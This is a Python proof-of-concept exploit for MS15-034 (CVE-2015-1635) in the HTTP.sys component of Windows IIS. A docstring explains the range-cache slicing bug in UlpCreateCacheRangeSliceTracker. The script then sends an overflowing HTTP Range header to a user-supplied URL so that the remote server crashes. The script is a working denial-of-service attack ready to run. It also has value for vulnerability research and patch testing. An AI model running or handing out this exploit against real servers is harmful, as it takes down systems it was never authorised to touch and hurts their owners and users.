"""
MS15-034 (CVE-2015-1635) proof of concept to corrupt memory

Note: I have no idea how to turn this memory corruption into code execution.
  There might be other way to trigger memory corruption but I do not find them.

This PoC causes the target to crash in UlpCreateCacheRangeSliceTracker().

Normally, w3wp.exe pass response chunk as file handle or buffer to HTTP.sys.
g_UriCacheConfig.uriMaxUriBytes in HTTP.sys is maximum size for response body
to be cached in HTTP.sys. The default value is 256KB.

When a full content size of request file is more than 256KB and request range
is less than 256KB, HTTP.sys slice the content to be cache. Each maximum slice
size is g_UriCacheConfig.uriMaxUriBytes (default value is 64KB).


Here are condition for HTTP.sys to build range cache with UlpCreateCacheRangeSliceTracker():
- UlAdjustRangesToContentSize() returned value is <= 256KB
- UlpGetRangeSliceCount() returned value is <= 256KB/64KB = 4
- rangeStart must be less than contentSize

When a full content size of request file is more than 256KB, cache is sliced in to 64KB pieces

Below is a partial pseudocode of UlpCreateCacheRangeSliceTracker()

    DOWRD i = 0;
    DWORD sliceNo = rangeStart / 65536;
    DWORD sliceEnd = (rangeEnd - 1) / 65536;
    while (sliceNo <= sliceEnd)
        useSlice[i++] = sliceNo++; // Note: useSlice array of DWORD allocated on stack

With the corrupted range, sliceEnd is always 0xffffffff. In this PoC I  use 
rangeStart 65538, which is sliceNo 1, so the above loop will start from 1.
If you want sliceNo to start with 0x00xxxxxx, you need to find a file size
2^(24+16) = 2^40 = 1TB on target.
"""

import socket
import sys
import urllib.request

#Checks if the user has provided a URL as an argument when calling script. If not, it prints usage instructions and exits script prematurely. 
if len(sys.argv) < 2:
    print('{} url [contentLength]'.format(sys.argv[0]))
    sys.exit(1)

url = sys.argv[1]
    

if len(sys.argv) > 2:
    contentLength = int(sys.argv[2])
else:
    req = urllib.request.Request(url)
    req.get_method = lambda : 'HEAD'
    resp = urllib.request.urlopen(req)
    contentLength = int(resp.info()['Content-Length'])
    resp.close()
    print('contentLength: {:d}'.format(contentLength))

if contentLength <= (256*1024):
    print('This PoC requires request target size more than 256KB')
    sys.exit(0)


req = urllib.request.Request(url)
req.add_header('Range', 'bytes=0-18446744073709551615,65540-131078,3-4')

try:
    resp = urllib.request.urlopen(req)
    # the remote target should crash now
    resp.close()
except:
    pass
